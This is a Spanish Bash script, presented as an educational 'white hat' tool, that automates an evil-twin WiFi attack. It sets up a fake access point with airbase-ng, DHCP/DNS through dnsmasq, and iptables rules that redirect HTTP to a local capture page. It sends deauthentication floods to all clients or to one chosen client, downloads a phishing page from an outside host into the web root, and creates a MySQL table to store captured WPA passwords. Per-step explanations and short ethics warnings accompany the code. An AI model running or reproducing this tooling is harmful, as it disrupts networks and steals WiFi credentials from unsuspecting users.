#!/bin/bash

# Autor: ING. Angel Gil -- The_White_Hat_?
# Script de Explicación Avanzada sobre Redes y Seguridad - Versión Automatizada

# Función para verificar e instalar requisitos
check_requirements() {
    printf "\n\033[1;33mVerificando requisitos...\033[0m\n"
    local packages=("mysql-server" "apache2" "aircrack-ng" "dnsmasq" "wget" "unzip")
    local missing=()

    for pkg in "${packages[@]}"; do
        if ! dpkg -l | grep -q " $pkg "; then
            missing+=("$pkg")
        fi
    done

    if [ ${#missing[@]} -eq 0 ]; then
        printf "\033[1;32mTodos los requisitos están instalados.\033[0m\n"
    else
        printf "\033[1;31mFaltan los siguientes paquetes: ${missing[*]}\033[0m\n"
        printf "\033[1;34m¿Desea instalarlos ahora? (s/n): \033[0m"
        read -r install
        if [[ "$install" =~ ^[sS]$ ]]; then
            printf "\n\033[1;33mActualizando lista de paquetes...\033[0m\n"
            sudo apt update
            for pkg in "${missing[@]}"; do
                printf "\n\033[1;33mInstalando $pkg...\033[0m\n"
                sudo apt install -y "$pkg"
                if [ $? -eq 0 ]; then
                    printf "\033[1;32m$pkg instalado correctamente.\033[0m\n"
                else
                    printf "\033[1;31mError al instalar $pkg. Verifique su conexión o permisos.\033[0m\n"
                    exit 1
                fi
            done
        else
            printf "\033[1;31mNo se instalarán los paquetes faltantes. El script podría no funcionar correctamente.\033[0m\n"
        fi
    fi
}

# Función para detectar adaptadores de red disponibles
detect_network_adapters() {
    printf "\n\033[1;33mDetectando adaptadores de red disponibles...\033[0m\n"
    adapters=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'))
    if [ ${#adapters[@]} -eq 0 ]; then
        printf "\033[1;31mNo se encontraron adaptadores de red inalámbricos.\033[0m\n"
        printf "Ejecute 'iwconfig' o 'airmon-ng' para verificar las interfaces disponibles.\n"
        exit 1
    fi
    printf "\nAdaptadores encontrados:\n"
    for i in "${!adapters[@]}"; do
        printf "$((i+1)). ${adapters[$i]}\n"
    done
}

# Seleccionar adaptador de red
select_adapter() {
    detect_network_adapters
    printf "\n\033[1;34mSeleccione un adaptador (número) o presione Enter para usar el primero (${adapters[0]}): \033[0m"
    read -r choice
    if [ -z "$choice" ]; then
        ADAPTER=${adapters[0]}
    else
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -le "${#adapters[@]}" ]; then
            ADAPTER=${adapters[$((choice-1))]}
        else
            printf "\033[1;31mOpción no válida, usando ${adapters[0]} por defecto.\033[0m\n"
            ADAPTER=${adapters[0]}
        fi
    fi
    if ! iwconfig "$ADAPTER" >/dev/null 2>&1; then
        printf "\033[1;31mError: El adaptador '$ADAPTER' no existe o no está disponible.\033[0m\n"
        printf "Ejecute 'iwconfig' para verificar.\n"
        printf "\033[1;34m¿Desea seleccionar otro adaptador? (s/n): \033[0m"
        read -r retry
        if [[ "$retry" =~ ^[sS]$ ]]; then
            select_adapter
        else
            exit 1
        fi
    fi
    printf "\033[1;32mAdaptador seleccionado: $ADAPTER\033[0m\n"
    sleep 2
}

# Función para iniciar modo monitor o verificar si ya está activo
start_monitor_mode() {
    printf "\n\033[1;33mVerificando modo monitor en $ADAPTER...\033[0m\n"
    if iwconfig "$ADAPTER" 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_ADAPTER="$ADAPTER"
        printf "\033[1;32mEl adaptador $ADAPTER ya está en modo monitor.\033[0m\n"
    else
        printf "\n\033[1;33mIniciando modo monitor en $ADAPTER...\033[0m\n"
        airmon-ng check kill
        AIRMON_OUTPUT=$(airmon-ng start "$ADAPTER" 2>&1)
        if [ $? -ne 0 ]; then
            printf "\033[1;31mError al ejecutar airmon-ng start. Salida:\n%s\033[0m\n" "$AIRMON_OUTPUT"
            printf "\033[1;31mNo se pudo iniciar modo monitor en $ADAPTER.\033[0m\n"
            printf "Sugerencias:\n"
            printf "  - Ejecute 'airmon-ng start $ADAPTER' manualmente para diagnosticar.\n"
            printf "  - Asegúrese de que el adaptador sea compatible con modo monitor.\n"
            exit 1
        fi
        MONITOR_ADAPTER=$(echo "$AIRMON_OUTPUT" | grep -oP '(?<=monitor mode enabled on ).*?(?=\s|$)' | head -n 1)
        if [ -z "$MONITOR_ADAPTER" ]; then
            printf "\033[1;31mNo se pudo determinar el nombre del adaptador en modo monitor. Salida de airmon-ng:\n%s\033[0m\n" "$AIRMON_OUTPUT"
            printf "\033[1;31mVerifique su adaptador y permisos.\033[0m\n"
            exit 1
        fi
    fi
    if ! iwconfig "$MONITOR_ADAPTER" >/dev/null 2>&1; then
        printf "\033[1;31mError: El adaptador en modo monitor '$MONITOR_ADAPTER' no está disponible.\033[0m\n"
        printf "Ejecute 'iwconfig' para verificar.\n"
        exit 1
    fi
    printf "\033[1;32mModo monitor activo en: $MONITOR_ADAPTER\033[0m\n"
}

# Función para mostrar el menú principal
show_menu() {
    clear
    printf "\n\033[1;36m==================================================\033[0m\n"
    printf "\033[1;32m|   ⚡ Configuración de Redes y Seguridad ⚡   |\033[0m\n"
    printf "\033[1;32m|        \033[1;33mBy ING. Angel Gil -- The_White_Hat_? \033[1;32m       |\033[0m\n"
    printf "\033[1;36m==================================================\033[0m\n"
    printf "\033[1;34m1. 📡 Configurar un Punto de Acceso Falso (Fake AP)\033[0m\n"
    printf "\033[1;34m2. 🌐 Configurar DNS y Asignación de IP\033[0m\n"
    printf "\033[1;34m3. 🔧 Crear Interfaz Virtual at0\033[0m\n"
    printf "\033[1;34m4. 🛑 Enviar Paquetes de Desautenticación\033[0m\n"
    printf "\033[1;34m5. 🖥️ Crear Página Web de Captura\033[0m\n"
    printf "\033[1;34m6. 🗄️ Configurar Base de Datos MySQL\033[0m\n"
    printf "\033[1;31m7. ❌ Salir\033[0m\n"
    printf "\033[1;36m==================================================\033[0m\n"
    printf "Seleccione una opción: "
}

# Función para preguntar al usuario si desea ejecutar o ver información
ask_user() {
    printf "\n\033[1;33m¿Desea ejecutar los comandos (e) o ver información sobre ellos (i)? (e/i): \033[0m"
    read -r action
    case $action in
        e|E) execute_commands ;;
        i|I) show_info ;;
        *) printf "\n\033[1;31mOpción no válida. Intente de nuevo.\n\033[0m"; ask_user ;;
    esac
}

# Función para configurar y ejecutar el ataque de desautenticación
configure_deauth() {
    printf "\n\033[1;33mIniciando escaneo de redes con airodump-ng. Presione Ctrl+C cuando haya seleccionado una red.\033[0m\n"
    airodump-ng "$MONITOR_ADAPTER"

    printf "\n\033[1;34mIngrese el BSSID del AP seleccionado (ejemplo: 64:58:AD:38:B3:1E): \033[0m"
    read -r bssid
    if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf "\033[1;31mBSSID inválido. Debe tener el formato XX:XX:XX:XX:XX:XX.\033[0m\n"
        return 1
    fi

    printf "\n\033[1;34mIngrese el canal del AP (ejemplo: 11, ver columna CH en airodump-ng): \033[0m"
    read -r channel
    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
        printf "\033[1;31mCanal inválido. Debe ser un número entre 1 y 14.\033[0m\n"
        return 1
    fi

    printf "\n\033[1;33mConfigurando $MONITOR_ADAPTER al canal $channel...\033[0m\n"
    if ! iwconfig "$MONITOR_ADAPTER" channel "$channel"; then
        printf "\033[1;31mError al configurar el canal $channel en $MONITOR_ADAPTER.\033[0m\n"
        return 1
    fi

    printf "\n\033[1;33m¿Qué tipo de ataque de desautenticación desea realizar?\033[0m\n"
    printf "1. A todos los clientes del AP\n"
    printf "2. A un cliente específico\n"
    printf "Seleccione una opción (1/2): "
    read -r deauth_type

    if [ "$deauth_type" -eq 2 ]; then
        printf "\n\033[1;33mEscaneando clientes conectados al AP $bssid en canal $channel. Presione Ctrl+C cuando haya seleccionado un cliente.\033[0m\n"
        airodump-ng --bssid "$bssid" --channel "$channel" "$MONITOR_ADAPTER"
        printf "\n\033[1;34mIngrese la dirección MAC del cliente (ejemplo: 62:0E:1C:D1:1D:69, ver columna STATION): \033[0m"
        read -r client_mac
        if ! [[ "$client_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            printf "\033[1;31mMAC del cliente inválida. Debe tener el formato XX:XX:XX:XX:XX:XX.\033[0m\n"
            return 1
        fi
    fi

    printf "\n\033[1;34mIngrese la cantidad de paquetes de desautenticación a enviar (0 para infinito): \033[0m"
    read -r packets
    if ! [[ "$packets" =~ ^[0-9]+$ ]]; then
        printf "\033[1;31mCantidad inválida. Debe ser un número entero mayor o igual a 0.\033[0m\n"
        return 1
    fi

    if [ "$deauth_type" -eq 1 ]; then
        printf "\n\033[1;32mIniciando ataque de desautenticación a todos los clientes del AP $bssid...\033[0m\n"
        aireplay-ng -0 "$packets" -a "$bssid" "$MONITOR_ADAPTER"
    elif [ "$deauth_type" -eq 2 ]; then
        printf "\n\033[1;32mIniciando ataque de desautenticación al cliente $client_mac en el AP $bssid...\033[0m\n"
        aireplay-ng -0 "$packets" -a "$bssid" -c "$client_mac" "$MONITOR_ADAPTER"
    else
        printf "\033[1;31mOpción no válida.\033[0m\n"
        return 1
    fi
}

# Función para ejecutar los comandos con verificación
execute_commands() {
    clear
    printf "\n\033[1;32mEjecutando comandos...\033[0m\n"
    case $choice in
        1)
            start_monitor_mode
            if ! airodump-ng "$MONITOR_ADAPTER"; then
                printf "\033[1;31mError al escanear con $MONITOR_ADAPTER.\033[0m\n"
                return 1
            fi
            printf "\n\033[1;34mIngrese el nombre del Punto de Acceso Falso (ESSID, ejemplo: MiRedFalsa): \033[0m"
            read -r essid
            if [ -z "$essid" ]; then
                printf "\033[1;31mEl ESSID no puede estar vacío.\033[0m\n"
                return 1
            fi
            printf "\n\033[1;34mIngrese el canal del Punto de Acceso Falso (ejemplo: 6, entre 1 y 14): \033[0m"
            read -r channel
            if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
                printf "\033[1;31mCanal inválido. Debe ser un número entre 1 y 14.\033[0m\n"
                return 1
            fi
            printf "\n\033[1;33mConfigurando $MONITOR_ADAPTER al canal $channel...\033[0m\n"
            if ! iwconfig "$MONITOR_ADAPTER" channel "$channel"; then
                printf "\033[1;31mError al configurar el canal $channel en $MONITOR_ADAPTER.\033[0m\n"
                return 1
            fi
            printf "\n\033[1;32mCreando Punto de Acceso Falso con ESSID '$essid' en canal $channel...\033[0m\n"
            if ! airbase-ng -e "$essid" -c "$channel" "$MONITOR_ADAPTER"; then
                printf "\033[1;31mError al crear Fake AP con $MONITOR_ADAPTER.\033[0m\n"
                return 1
            fi
            ;;
        2)
            cat <<EOL | sudo tee /etc/dnsmasq.conf > /dev/null
interface=at0
dhcp-range=192.168.2.130,192.168.2.254,12h
dhcp-option=3,192.168.2.129
dhcp-option=6,8.8.8.8,8.8.4.4
log-queries
log-dhcp
EOL
            if ! sudo dnsmasq -C /etc/dnsmasq.conf; then
                printf "\033[1;31mError al iniciar dnsmasq.\033[0m\n"
                return 1
            fi
            ;;
        3)
            if ! ifconfig at0 192.168.2.129 netmask 255.255.255.128 up; then
                printf "\033[1;31mError al configurar at0.\033[0m\n"
                return 1
            fi
            route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129
            echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
            sudo iptables --flush
            sudo iptables --table nat --flush
            sudo iptables --delete-chain
            sudo iptables --table nat --delete-chain
            sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
            sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
            sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$(hostname -I | awk '{print $1}'):80"
            sudo iptables -t nat -A POSTROUTING -j MASQUERADE
            if ! sudo dnsmasq -C /etc/dnsmasq.conf; then
                printf "\033[1;31mError al iniciar dnsmasq.\033[0m\n"
                return 1
            fi
            ;;
        4)
            start_monitor_mode
            configure_deauth
            ;;
        5)
            cd /var/www/html || { printf "\033[1;31mError al cambiar al directorio /var/www/html.\033[0m\n"; return 1; }
            if ! wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip; then
                printf "\033[1;31mError al descargar Rogue_AP.zip.\033[0m\n"
                return 1
            fi
            unzip Rogue_AP.zip
            rm -rf __MACOSX Rogue_AP.zip
            mv Rogue_AP/* .
            sudo service apache2 start && sudo service mysql start
            ;;
        6)
            if ! mysql -uroot -e "CREATE DATABASE rogue_AP; USE rogue_AP; CREATE TABLE wpa_keys(password1 VARCHAR(32), password2 VARCHAR(32)); INSERT INTO wpa_keys (password1, password2) VALUES ('hola', 'hola'); CREATE USER 'fakeap'@'localhost' IDENTIFIED BY 'fakeap'; GRANT ALL PRIVILEGES ON rogue_AP.* TO 'fakeap'@'localhost';"; then
                printf "\033[1;31mError al configurar la base de datos MySQL.\033[0m\n"
                return 1
            fi
            ;;
        *) printf "\n\033[1;31mOpción no válida.\n\033[0m"; sleep 2 ;;
    esac
    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Función para mostrar información sobre los comandos
show_info() {
    case $choice in
        1) explain_fake_ap ;;
        2) explain_dns_ip ;;
        3) explain_interface ;;
        4) explain_deauth ;;
        5) explain_web_creation ;;
        6) explain_database_creation ;;
        *) printf "\n\033[1;31mOpción no válida. Intente de nuevo.\n\033[0m"; sleep 2 ;;
    esac
}

# Explicación y sintaxis de los comandos para la configuración de MySQL
explain_database_creation() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|     🗄️ Configuración de la Base de Datos MySQL  |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Iniciar sesión en MySQL\033[0m\n"
    printf "  📌 Comando: \033[1;32mmysql -uroot\033[0m\n"
    printf "  ➜ Inicia sesión en MySQL como usuario root.\n"

    printf "\n🔹 \033[1;33mPaso 2: Crear una nueva base de datos\033[0m\n"
    printf "  📌 Comando: \033[1;32mCREATE DATABASE rogue_AP;\033[0m\n"
    printf "  ➜ Crea una base de datos llamada 'rogue_AP'.\n"

    printf "\n🔹 \033[1;33mPaso 3: Usar la base de datos creada\033[0m\n"
    printf "  📌 Comando: \033[1;32mUSE rogue_AP;\033[0m\n"
    printf "  ➜ Selecciona la base de datos 'rogue_AP'.\n"

    printf "\n🔹 \033[1;33mPaso 4: Crear una tabla para almacenar contraseñas\033[0m\n"
    printf "  📌 Comando: \033[1;32mCREATE TABLE wpa_keys(password1 VARCHAR(32), password2 VARCHAR(32));\033[0m\n"
    printf "  ➜ Genera una tabla con dos columnas para contraseñas.\n"

    printf "\n🔹 \033[1;33mPaso 5: Insertar un valor de prueba\033[0m\n"
    printf "  📌 Comando: \033[1;32mINSERT INTO wpa_keys (password1, password2) VALUES ('hola', 'hola');\033[0m\n"
    printf "  ➜ Agrega un registro de prueba.\n"

    printf "\n🔹 \033[1;33mPaso 6: Crear un usuario de MySQL para la web\033[0m\n"
    printf "  📌 Comando: \033[1;32mCREATE USER 'fakeap'@'localhost' IDENTIFIED BY 'fakeap';\033[0m\n"
    printf "  ➜ Crea un usuario 'fakeap' con contraseña 'fakeap'.\n"

    printf "\n🔹 \033[1;33mPaso 7: Conceder permisos al usuario\033[0m\n"
    printf "  📌 Comando: \033[1;32mGRANT ALL PRIVILEGES ON rogue_AP.* TO 'fakeap'@'localhost';\033[0m\n"
    printf "  ➜ Otorga todos los permisos al usuario 'fakeap'.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación y sintaxis de los comandos para Fake AP
explain_fake_ap() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|          📡 Configuración de un Fake AP       |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Iniciar la interfaz en modo monitor\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng start $ADAPTER\033[0m\n"
    printf "  ➜ Activa la interfaz en modo monitor.\n"

    printf "\n🔹 \033[1;33mPaso 2: Matar procesos que interfieran\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
    printf "  ➜ Cierra procesos en segundo plano que puedan interferir.\n"

    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas (opcional)\033[0m\n"
    printf "  📌 Comando: \033[1;32mairodump-ng [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Muestra una lista de redes disponibles para elegir un canal adecuado.\n"

    printf "\n🔹 \033[1;33mPaso 4: Configurar el canal del adaptador\033[0m\n"
    printf "  📌 Comando: \033[1;32miwconfig [MONITOR_ADAPTER] channel [CANAL]\033[0m\n"
    printf "  ➜ Ajusta el adaptador al canal elegido para el AP falso.\n"

    printf "\n🔹 \033[1;33mPaso 5: Crear el Fake AP\033[0m\n"
    printf "  📌 Comando: \033[1;32mairbase-ng -e [ESSID] -c [CANAL] [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Genera un AP falso con el ESSID y canal especificados.\n"

    printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Usar con responsabilidad y ética.\n"
    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de DNS y Asignación de IP
explain_dns_ip() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🌐 Configuración de DNS y DHCP           |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Configurar archivo de dnsmasq\033[0m\n"
    printf "  📌 Comando: \033[1;32mcat <<EOL | sudo tee /etc/dnsmasq.conf\033[0m\n"
    printf "  Contenido:\n"
    printf "    interface=at0\n"
    printf "    dhcp-range=192.168.2.130,192.168.2.254,12h\n"
    printf "    dhcp-option=3,192.168.2.129\n"
    printf "    dhcp-option=6,8.8.8.8,8.8.4.4\n"
    printf "    log-queries\n"
    printf "    log-dhcp\n"
    printf "  ➜ Configura dnsmasq para DHCP y DNS.\n"

    printf "\n🔹 \033[1;33mPaso 2: Iniciar dnsmasq\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo dnsmasq -C /etc/dnsmasq.conf\033[0m\n"
    printf "  ➜ Inicia el servicio dnsmasq con la configuración.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de la interfaz at0
explain_interface() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🔧 Creación de la Interfaz Virtual at0   |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Configurar dirección IP\033[0m\n"
    printf "  📌 Comando: \033[1;32mifconfig at0 192.168.2.129 netmask 255.255.255.128 up\033[0m\n"
    printf "  ➜ Asigna una IP a la interfaz virtual at0.\n"

    printf "\n🔹 \033[1;33mPaso 2: Definir una ruta de red\033[0m\n"
    printf "  📌 Comando: \033[1;32mroute add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129\033[0m\n"
    printf "  ➜ Agrega una ruta para la subred.\n"

    printf "\n🔹 \033[1;33mPaso 3: Habilitar reenvío de paquetes\033[0m\n"
    printf "  📌 Comando: \033[1;32mecho 1 | sudo tee /proc/sys/net/ipv4/ip_forward\033[0m\n"
    printf "  ➜ Activa el reenvío de paquetes IP.\n"

    printf "\n🔹 \033[1;33mPaso 4: Limpiar reglas de firewall\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --flush\033[0m\n"
    printf "  ➜ Elimina todas las reglas de iptables.\n"

    printf "\n🔹 \033[1;33mPaso 5: Limpiar reglas NAT\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --table nat --flush\033[0m\n"
    printf "  ➜ Limpia las reglas de la tabla NAT.\n"

    printf "\n🔹 \033[1;33mPaso 6: Eliminar cadenas personalizadas\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --delete-chain\033[0m\n"
    printf "  ➜ Borra cadenas personalizadas en iptables.\n"

    printf "\n🔹 \033[1;33mPaso 7: Eliminar cadenas personalizadas en NAT\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --table nat --delete-chain\033[0m\n"
    printf "  ➜ Borra cadenas personalizadas en la tabla NAT.\n"

    printf "\n🔹 \033[1;33mPaso 8: Configurar NAT y enmascarado\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE\033[0m\n"
    printf "  ➜ Habilita el enmascarado NAT.\n"

    printf "\n🔹 \033[1;33mPaso 9: Permitir forwarding de tráfico\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables --append FORWARD --in-interface at0 -j ACCEPT\033[0m\n"
    printf "  ➜ Permite el reenvío de tráfico desde at0.\n"

    printf "\n🔹 \033[1;33mPaso 10: Redirigir tráfico HTTP\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80\033[0m\n"
    printf "  ➜ Redirige el tráfico HTTP a la IP local del sistema.\n"

    printf "\n🔹 \033[1;33mPaso 11: Enmascarar tráfico de salida\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo iptables -t nat -A POSTROUTING -j MASQUERADE\033[0m\n"
    printf "  ➜ Enmascara el tráfico saliente.\n"

    printf "\n🔹 \033[1;33mPaso 12: Iniciar dnsmasq\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo dnsmasq -C /etc/dnsmasq.conf\033[0m\n"
    printf "  ➜ Inicia dnsmasq con la configuración.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación de la desautenticación
explain_deauth() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🛑 Envío de Paquetes de Desautenticación |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Iniciar modo monitor\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng start $ADAPTER\033[0m\n"
    printf "  ➜ Activa el modo monitor en la interfaz.\n"

    printf "\n🔹 \033[1;33mPaso 2: Matar procesos que interfieran\033[0m\n"
    printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
    printf "  ➜ Elimina procesos que puedan interferir.\n"

    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas\033[0m\n"
    printf "  📌 Comando: \033[1;32mairodump-ng [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Muestra las redes disponibles. Anote el BSSID y el canal (columna CH) de la red objetivo.\n"

    printf "\n🔹 \033[1;33mPaso 4: Configurar el canal del adaptador\033[0m\n"
    printf "  📌 Comando: \033[1;32miwconfig [MONITOR_ADAPTER] channel [CANAL]\033[0m\n"
    printf "  ➜ Ajusta el adaptador al canal del AP objetivo.\n"

    printf "\n🔹 \033[1;33mPaso 5: Escanear clientes del AP seleccionado\033[0m\n"
    printf "  📌 Comando: \033[1;32mairodump-ng --bssid [BSSID] --channel [CANAL] [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Muestra los clientes conectados al AP especificado. Anote la MAC del cliente (columna STATION).\n"

    printf "\n🔹 \033[1;33mPaso 6: Ataque de desautenticación a todos los clientes\033[0m\n"
    printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Envía [PAQUETES] paquetes de desautenticación a todos los clientes del AP identificado por [BSSID]. Use 0 para infinito.\n"

    printf "\n🔹 \033[1;33mPaso 7: Ataque de desautenticación a un cliente específico\033[0m\n"
    printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] -c [MAC_CLIENTE] [MONITOR_ADAPTER]\033[0m\n"
    printf "  ➜ Envía [PAQUETES] paquetes de desautenticación al cliente [MAC_CLIENTE] conectado al AP [BSSID].\n"

    printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Solo para pruebas de seguridad autorizadas.\n"
    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Explicación y sintaxis de los comandos para la creación de la web
explain_web_creation() {
    clear
    printf "\n\033[1;35m==================================================\n"
    printf "|      🖥️ Creación de la Página Web de Captura    |\n"
    printf "==================================================\033[0m\n"

    printf "\n🔹 \033[1;33mPaso 1: Moverse al directorio web\033[0m\n"
    printf "  📌 Comando: \033[1;32mcd /var/www/html\033[0m\n"
    printf "  ➜ Cambia al directorio raíz de la web.\n"

    printf "\n🔹 \033[1;33mPaso 2: Descargar los archivos necesarios\033[0m\n"
    printf "  📌 Comando: \033[1;32mwget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip\033[0m\n"
    printf "  ➜ Descarga el archivo ZIP con la página de captura.\n"

    printf "\n🔹 \033[1;33mPaso 3: Extraer archivos\033[0m\n"
    printf "  📌 Comando: \033[1;32munzip Rogue_AP.zip\033[0m\n"
    printf "  ➜ Descomprime el archivo descargado.\n"

    printf "\n🔹 \033[1;33mPaso 4: Limpiar archivos innecesarios\033[0m\n"
    printf "  📌 Comando: \033[1;32mrm -rf __MACOSX Rogue_AP.zip\033[0m\n"
    printf "  ➜ Elimina archivos residuales.\n"

    printf "\n🔹 \033[1;33mPaso 5: Mover archivos a la ubicación correcta\033[0m\n"
    printf "  📌 Comando: \033[1;32mmv Rogue_AP/* .\033[0m\n"
    printf "  ➜ Mueve los archivos al directorio principal.\n"

    printf "\n🔹 \033[1;33mPaso 6: Iniciar servicios web\033[0m\n"
    printf "  📌 Comando: \033[1;32msudo service apache2 start && sudo service mysql start\033[0m\n"
    printf "  ➜ Inicia Apache y MySQL.\n"

    printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
    read -r
}

# Verificar requisitos al inicio
check_requirements

# Seleccionar adaptador al inicio
select_adapter

# Bucle principal del menú
while true; do
    show_menu
    read -r choice
    case $choice in
        7) printf "\n\033[1;31mSaliendo... ¡Hasta luego!\n\033[0m"; exit 0 ;;
        1|2|3|4|5|6) ask_user ;;
        *) printf "\n\033[1;31mOpción no válida. Intente de nuevo.\n\033[0m"; sleep 2 ;;
    esac
done
